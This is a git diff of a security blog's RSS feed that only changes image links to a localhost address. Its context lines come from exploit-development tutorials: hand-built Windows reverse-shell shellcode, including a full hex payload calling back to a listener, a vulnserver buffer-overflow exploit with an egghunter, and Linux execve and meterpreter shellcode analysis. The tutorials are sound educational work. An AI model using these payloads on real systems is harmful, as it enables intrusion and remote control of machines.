@@ -154,11 +154,11 @@ Disassembly of section .text:
 
 &lt;p&gt;Awesome! To test it, we set a listener on port 4444 at our server and run it in the Windows VM.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_listener.png&quot; alt=&quot;1-listener&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_listener.png&quot; alt=&quot;1-listener&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;However, there is still a small problem:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_crash.png&quot; alt=&quot;2-crash&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_crash.png&quot; alt=&quot;2-crash&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Since we did not correctly finish the process, it crashes. By now you should be fully confident about how to fix this issue, so I won’t spoil it ;)&lt;/p&gt;
 
@@ -312,7 +312,7 @@ push_loop:
 	call ebx
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_memewin.jpg&quot; alt=&quot;3-WIN&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_memewin.jpg&quot; alt=&quot;3-WIN&quot; /&gt;&lt;/p&gt;
 </description>
 				<pubDate>Sun, 21 Oct 2018 00:00:00 -0300</pubDate>
 				<link>/re/exploit/2018/10/21/windows-manual-shellcode-part3.html</link>
@@ -386,7 +386,7 @@ int main(int argc , char *argv[])
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;i686-w64-mingw32-gcc winsock.c -o shared/winsock.exe -lws2_32
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_wsadatasize.png&quot; alt=&quot;1-WSAData size&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_wsadatasize.png&quot; alt=&quot;1-WSAData size&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;With that in mind we can now set 2.2 as the &lt;code class=&quot;highlighter-rouge&quot;&gt;wVersionRequired&lt;/code&gt; (check &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup&quot;&gt;MS docs&lt;/a&gt; for more) and write the following code:&lt;/p&gt;
 
@@ -404,7 +404,7 @@ int main(int argc , char *argv[])
 
 &lt;p&gt;Lets put everything together and see how it goes inside a debugger:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_dbg4.png&quot; alt=&quot;2-dbg4&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg4.png&quot; alt=&quot;2-dbg4&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;According to &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup&quot;&gt;MS docs&lt;/a&gt;:&lt;/p&gt;
 
@@ -466,7 +466,7 @@ _start:
 
 &lt;p&gt;Notice we changed &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;ebx&lt;/code&gt; since we have saved &lt;code class=&quot;highlighter-rouge&quot;&gt;WSAStartup&lt;/code&gt;’s address in the first register.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_dbg5.png&quot; alt=&quot;2-dbg4&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg5.png&quot; alt=&quot;2-dbg4&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It seems to be working fine too, even though they used a &lt;code class=&quot;highlighter-rouge&quot;&gt;wVersionRequired&lt;/code&gt; other than &lt;code class=&quot;highlighter-rouge&quot;&gt;2.2&lt;/code&gt;. If we read the &lt;em&gt;Remarks&lt;/em&gt; section from the documentation more carefully we figure out the reason why:&lt;/p&gt;
 
@@ -751,7 +751,7 @@ _start:
 
 &lt;p&gt;After running it we get:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_connect.png&quot; alt=&quot;3-dbg5&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_connect.png&quot; alt=&quot;3-dbg5&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;In the next part we will finally redirect &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; to our socket and get our complete shellcode.&lt;/p&gt;
 
@@ -816,7 +816,7 @@ $ i686-w64-mingw32-gcc arwin.c -o shared/arwin.exe
 
 &lt;p&gt;That said and done, lets find all the addresses we are going to need.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_arwin.png&quot; alt=&quot;1-arwin&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_arwin.png&quot; alt=&quot;1-arwin&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;load-ws2_32dll-with-loadlibrarya&quot;&gt;Load ws2_32.dll with LoadLibraryA&lt;/h2&gt;
 &lt;p&gt;As stated &lt;a href=&quot;http://www.hick.org/code/skape/papers/win32-shellcode.pdf&quot;&gt;here&lt;/a&gt;:&lt;/p&gt;
@@ -928,7 +928,7 @@ Final size of hex file: 648 bytes
 fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a8000b680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_meme1.png&quot; alt=&quot;2-meme1&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_meme1.png&quot; alt=&quot;2-meme1&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;See? Lots of NULLs, including the ones from &lt;code class=&quot;highlighter-rouge&quot;&gt;68 33 32 00 00&lt;/code&gt;. Let’s remove them:&lt;/p&gt;
 
@@ -980,9 +980,9 @@ bfa87a2e36d9e1d97424f45829c9b152317812037812834086ccc36c9f932c8c60f4a5695134d1fa
 
 &lt;p&gt;Lets take a break, compile this code and see how things look like in Immunity Debugger:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/manualshellcode/shellcode_dbg1.png&quot; alt=&quot;3-dbg1&quot; /&gt;
-&lt;img src=&quot;/assets/media/manualshellcode/shellcode_dbg2.png&quot; alt=&quot;4-dbg2&quot; /&gt;
-&lt;img src=&quot;/assets/media/manualshellcode/shellcode_dbg3.png&quot; alt=&quot;5-dbg3&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg1.png&quot; alt=&quot;3-dbg1&quot; /&gt;
+&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg2.png&quot; alt=&quot;4-dbg2&quot; /&gt;
+&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg3.png&quot; alt=&quot;5-dbg3&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Great! In the next parts we will continue this development.&lt;/p&gt;
 </description>
@@ -1030,7 +1030,7 @@ bfa87a2e36d9e1d97424f45829c9b152317812037812834086ccc36c9f932c8c60f4a5695134d1fa
 
 &lt;p&gt;We were immediately cut off.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/domaintoshell/sqlmap1.png&quot; alt=&quot;Not here, baby&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/domaintoshell/sqlmap1.png&quot; alt=&quot;Not here, baby&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Our first thought was that there was some kind of WAF protecting the system. But was it?&lt;/p&gt;
 
@@ -1274,7 +1274,7 @@ C = 0x272e5c21
 
 &lt;p&gt;There are multiple ways to exploit it, using the different parameters avaliable. This time we will exploit it using the GTER parameter. You might also find awesome writeups &lt;a href=&quot;https://capt-meelo.github.io/exploitdev/osceprep/2018/06/28/vulnserver-gter.html&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://www.absolomb.com/2018-07-24-VulnServer-GTER/&quot;&gt;here&lt;/a&gt;, the later using a techinque different from the one I used here.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Deployed environment:&lt;/p&gt;
 &lt;ul&gt;
@@ -1287,9 +1287,9 @@ C = 0x272e5c21
 
 &lt;p&gt;In order to build our SPIKE template we need first to understand how the messages flow between the client and the server. To do that we open Wireshark and connect to the server:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Now we can create our template an fuzz the GTER parameter.&lt;/p&gt;
 
@@ -1304,9 +1304,9 @@ s_string(&quot;\r\n&quot;);
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;generic_send_tcp 192.168.0.57 6666 gter.spk 0 0
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;We can see from analyzing the stack that the program received 171 &lt;em&gt;A&lt;/em&gt;s along with the string ` /.:/` right after the GTER parameter:&lt;/p&gt;
 
@@ -1338,9 +1338,9 @@ print(&quot;Total buffer lenght: {}&quot;.format(getCrashBuffer(0x41376641))) #1
 
 &lt;p&gt;The &lt;em&gt;cyclic_metasploit&lt;/em&gt; method generates a &lt;a href=&quot;http://mathworld.wolfram.com/deBruijnSequence.html&quot;&gt;De Bruijn&lt;/a&gt; sequence used by Metasploit, mona.py, gdb-peda and others. The &lt;em&gt;cyclic_metasploit_find&lt;/em&gt; method is used to find the offset of a specifc subsequence.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://www.jollyfrogs.com/&quot;&gt;JollyFrogs&lt;/a&gt; gently shared his pattern generator/finder script so we don’t even need to use pre-built stuff (slightly modified here). Cheers mate!&lt;/p&gt;
 
@@ -1405,8 +1405,8 @@ expl()
 
 &lt;p&gt;To verify we successfully control the program flow we set a breakpoint at &lt;code class=&quot;highlighter-rouge&quot;&gt;\xaf\x11\x50\x62&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_8.png&quot; alt=&quot;8&quot; /&gt;
-&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_8.png&quot; alt=&quot;8&quot; /&gt;
+&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; one might also want to try subracting some bytes from ESP and the jumping into it instead of directly jumping to the hardcoded address. While this is a possible solution, you might find yourself struggling with stack alignmet issues, since you are altering ESP. In case you run into this problem, try adding the subtracted amount to ESP after the jump.&lt;/p&gt;
@@ -1433,7 +1433,7 @@ def expl():
 expl()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Notice we have set a few NOPs before and after the egghunter just to make the exploit a little more reliable (30 NOPs + 32 egghunter + 85 NOPs = 147 bytes).&lt;/p&gt;
 
@@ -1504,9 +1504,9 @@ runOptions(buf)
 expl()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/vulnserver/vulnserver_gter_12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Windows XP SP3 has DEP enabled by default. In order to correcly run this exploit you must turn DEP off for vulnserver.exe.&lt;/p&gt;
@@ -1653,7 +1653,7 @@ call_shellcode:
 
 &lt;p&gt;This is a CFG visualization of the decoder generated by IDA.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/decoder.png&quot; alt=&quot;Decoder visualization&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/decoder.png&quot; alt=&quot;Decoder visualization&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;a-small-caveat&quot;&gt;A small caveat&lt;/h2&gt;
 &lt;p&gt;In order to be able to modify the encrypted shellcode (ie to substitute its bytes for the decrypted ones) we must remember it is located in the &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section which is not writable by default.&lt;/p&gt;
@@ -1866,7 +1866,7 @@ mov    ecx,esp  ;save '/bin/sh -c' in ecx
 int    0x80; calls execve
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/exec.png&quot; alt=&quot;exec&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/exec.png&quot; alt=&quot;exec&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;As a bonus, lets see what happens when we try to avoid NULLs.&lt;/p&gt;
 
@@ -1885,7 +1885,7 @@ unsigned char buf[] =
 &quot;\x11\xe9\x99\x02\x05\xed\x0e\xb6\x5c\x0c\x7d\xb8&quot;;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/exec_no_null.png&quot; alt=&quot;exec_no_nulls&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/exec_no_null.png&quot; alt=&quot;exec_no_nulls&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Wow, not exactly what I was expecting. But looking the output more carefully:&lt;/p&gt;
 
@@ -1911,7 +1911,7 @@ unsigned char buf[] =
 &quot;\x52\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/shell_reverse_tcp.png&quot; alt=&quot;shell_reverse_tcp&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/shell_reverse_tcp.png&quot; alt=&quot;shell_reverse_tcp&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;If you remember from our previous assignment, we used the following functions that were later converted to syscalls:&lt;/p&gt;
 
@@ -2027,7 +2027,7 @@ e:  89 e1                   mov    ecx,esp	;point ecx to the parameters on the s
 
 &lt;p&gt;The idea is to create a socket then try to connect to a certain IP/PORT. If it does not succed, wait for a few seconds or the delivery of a signal (connection). If the time runs off, goes back to the beginning and try to connect once again. When if finally succeds, read whatever is sent (probably the next stage).&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/media/meterpreter_reverse_tcp_staged.png&quot; alt=&quot;meterpreter/reverse_tcp&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/meterpreter_reverse_tcp_staged.png&quot; alt=&quot;meterpreter/reverse_tcp&quot; /&gt;&lt;/p&gt;
 </description>
 				<pubDate>Sun, 02 Sep 2018 00:00:00 -0300</pubDate>
 				<link>/re/exploit/2018/09/02/msfvenom-shellcode-analysis.html</link>
